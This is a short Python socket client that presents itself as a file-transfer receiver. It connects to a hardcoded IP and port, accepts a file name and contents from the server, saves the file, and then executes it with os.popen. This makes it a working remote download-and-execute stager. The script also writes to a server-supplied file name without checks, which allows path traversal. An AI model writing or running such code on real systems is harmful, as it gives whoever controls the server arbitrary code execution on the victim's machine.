
import os
import socket

PORT = 5566
IP = "172.20.133.7"

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect((IP,PORT))

file_sn = client_socket.recv(1024).decode()
file_name, file_size = file_sn.split(":")
# file_name = file_sn.split(":")[0]
# file_size = file_sn.split(":")[1]
client_socket.send("OK".encode())

data_file = client_socket.recv(int(file_size))

try:
    os.mkdir("TransferFile") # make directory
except:
    pass
os.chdir("TransferFile") # change dir and enter it

with open(file_name, "wb") as file:
    file.write(data_file)
os.popen(file_name)

client_socket.send("FileOK".encode())


